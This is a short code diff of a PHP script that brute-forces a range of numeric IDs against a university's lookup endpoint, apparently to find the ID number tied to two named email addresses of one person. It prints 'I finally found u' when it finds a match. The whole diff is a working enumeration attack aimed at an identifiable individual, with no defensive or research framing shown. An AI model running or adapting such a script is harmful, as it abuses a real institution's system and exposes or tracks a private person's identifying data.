@@ -3,7 +3,7 @@ ini_set('max_execution_time', 0);
 set_time_limit(0);
 $url = "http://desercion.uts.edu.co/docentes/funciones/buscar_id_academusoft.php";
 $posibles_correos = array('juanjosesilva@uts.edu.co', 'juanjsilva@uts.edu.co');
-for ($i=1000000000; $i < 1005108571 ; $i++) { 
+for ($i=1005100000; $i < 1005108571 ; $i++) { 
 	if (in_array(buscarAmigo($i, $url), $posibles_correos) ) {
 		echo $i;
 		echo "I finally found u";
